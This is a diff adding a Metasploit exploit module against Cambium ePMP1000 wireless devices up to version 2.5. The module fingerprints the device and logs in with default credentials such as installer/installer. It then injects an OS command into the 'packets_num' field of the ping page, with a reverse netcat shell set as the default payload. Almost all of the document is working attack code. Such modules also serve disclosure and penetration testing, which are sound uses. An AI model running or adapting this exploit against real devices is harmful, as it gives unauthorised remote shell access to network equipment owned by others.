@@ -1,0 +1,254 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "Cambium ePMP1000 'ping' Shell via Command Injection (up to v2.5)",
+      'Description' => %{
+          This module exploits an OS Command Injection vulnerability in Cambium
+          ePMP1000 device management portal. It requires any one of the following login
+          credentials - admin/admin, installer/installer, home/home - to set up a reverse
+          netcat shell.
+      },
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+        ],
+      'References' =>
+        [
+          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
+          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
+        ],
+      'Privileged' => true,
+      'Targets' =>
+        [
+          ['EPMP',
+            {
+              'Arch' => ARCH_CMD,
+              'Platform' => 'unix'
+            }
+          ]
+        ],
+      'DisclosureDate' => 'Nov 28 2015',
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' })
+    )
+
+    register_options(
+      [
+        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
+        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
+        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
+      ], self.class
+    )
+
+    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
+  end
+
+  #
+  # Fingerprinting
+  #
+  def is_app_epmp1000?
+    begin
+      res = send_request_cgi(
+        {
+          'uri'       => '/',
+          'method'    => 'GET'
+        }
+      )
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      return false
+    end
+
+    good_response = (
+      res &&
+      res.code == 200 &&
+      (res.body.include?('cambium.min.css') || res.body.include?('cambiumnetworks.com') && res.body.include?('https://support.cambiumnetworks.com/files/epmp/'))
+    )
+
+    if good_response
+      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
+      if !get_epmp_ver.nil?
+        epmp_ver = get_epmp_ver[1]
+        if !epmp_ver.nil?
+          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
+          return true, epmp_ver
+        else
+          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
+          epmp_ver = ''
+          return true, epmp_ver
+        end
+      end
+    else
+      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. The target is not vulnerable.")
+      epmp_ver = nil
+      return false
+    end
+  end
+
+  #
+  # check
+  #
+  def check
+    success, epmp_ver = is_app_epmp1000?
+    if (success != 'false' && !epmp_ver.nil? && epmp_ver < '2.5')
+      return CheckCode::Vulnerable
+    else
+      return CheckCode::Safe # Using 'Safe' here to imply this ver is not exploitable using ~the module~'
+    end
+  end
+
+  #
+  # Login
+  #
+  def login(user, pass)
+    res = send_request_cgi(
+      {
+        'uri' => '/cgi-bin/luci',
+        'method' => 'POST',
+        'headers' => {
+          'X-Requested-With' => 'XMLHttpRequest',
+          'Accept' => 'application/json, text/javascript, */*; q=0.01'
+        },
+        'vars_post' =>
+          {
+            'username' => 'dashboard',
+            'password' => ''
+          }
+      }
+    )
+
+    cookies = res.get_cookies_parsed
+    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
+
+    good_response = (
+      res &&
+      res.code == 200 &&
+      check_sysauth.include?('sysauth')
+    )
+
+    if good_response
+      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
+      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)
+
+      cookie1 = "#{sysauth_value}" + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"
+
+      res = send_request_cgi(
+        {
+          'uri' => '/cgi-bin/luci',
+          'method' => 'POST',
+          'cookie' => cookie1,
+          'headers' => {
+            'X-Requested-With' => 'XMLHttpRequest',
+            'Accept' => 'application/json, text/javascript, */*; q=0.01',
+            'Connection' => 'close'
+          },
+          'vars_post' =>
+            {
+              'username' => user,
+              'password' => pass
+            }
+        }
+      )
+
+      cookies = res.get_cookies_parsed
+
+      good_response = (
+        res &&
+        res.code == 200 &&
+        !res.body.include?('auth_failed')
+      )
+
+      if good_response
+        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
+
+        # check if max_user_number_reached?
+        if !res.body.include?('max_user_number_reached')
+        # get the final cookie now
+          cookies = res.get_cookies_parsed
+          stok_value = cookies.has_key?('stok') && cookies['stok'].first
+          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s
+          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)
+
+          final_cookie = "#{sysauth_value}" + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + stok_value
+
+          # create config_uri
+          config_uri_ping = '/cgi-bin/luci/;stok=' + stok_value + '/admin/ping'
+
+          return final_cookie, config_uri_ping
+        else
+          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')
+          final_cookie = 'skip'
+          config_uri_ping = 'skip'
+          return final_cookie, config_uri_ping
+        end
+      else
+        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
+        final_cookie = 'skip'
+        config_uri_ping = 'skip'
+        return final_cookie, config_uri_ping
+      end
+    end
+  end
+
+  #
+  # open cmd_shell
+  #
+  def cmd_shell(config_uri, cookie)
+    command = payload.encoded
+    inject = '|' + "#{command}" + ' ||'
+    clean_inject = CGI.unescapeHTML(inject.to_s)
+
+    print_status('Sending payload...')
+
+    res = send_request_cgi(
+      {
+        'method' => 'POST',
+        'uri' => config_uri,
+        'cookie' => cookie,
+        'headers' => {
+          'Accept' => '*/*',
+          'Accept-Language' => 'en-US,en;q=0.5',
+          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
+          'X-Requested-With' => 'XMLHttpRequest',
+          'Connection' => 'close'
+        },
+        'vars_post' =>
+          {
+            'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
+            'packets_num' => clean_inject,
+            'buf_size' => 0,
+            'ttl' => 1,
+            'debug' => '0'
+          }
+      }, 25
+    )
+    handler
+  end
+
+  # exploit
+
+  def exploit
+    success, epmp_ver = is_app_epmp1000?
+    if epmp_ver < '2.5'
+      cookie, config_uri_ping = login(datastore['USERNAME'], datastore['PASSWORD'])
+      if cookie == 'skip' && config_uri_ping == 'skip'
+        return
+      else
+        cmd_shell(config_uri_ping, cookie)
+      end
+    else
+      print_error('This ePMP version is not vulnerable. Module will not continue.')
+      return
+    end
+  end
+end
